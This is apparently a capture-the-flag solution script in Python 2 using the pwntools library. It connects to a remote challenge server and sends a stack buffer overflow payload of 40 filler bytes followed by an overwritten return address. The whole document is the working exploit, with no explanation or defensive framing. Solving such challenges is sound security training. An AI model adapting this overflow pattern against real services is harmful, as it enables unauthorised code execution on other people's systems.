#!/usr/bin/env python
from pwn import *
r = remote("pwn.botani.cf", 3234)

buf = ""
buf += "0"*40           
buf += p64(0x40079C)
buf += "\r\n"

print "Sending payload"
print r.recv()
r.sendline(buf)
print r.recvuntil("")
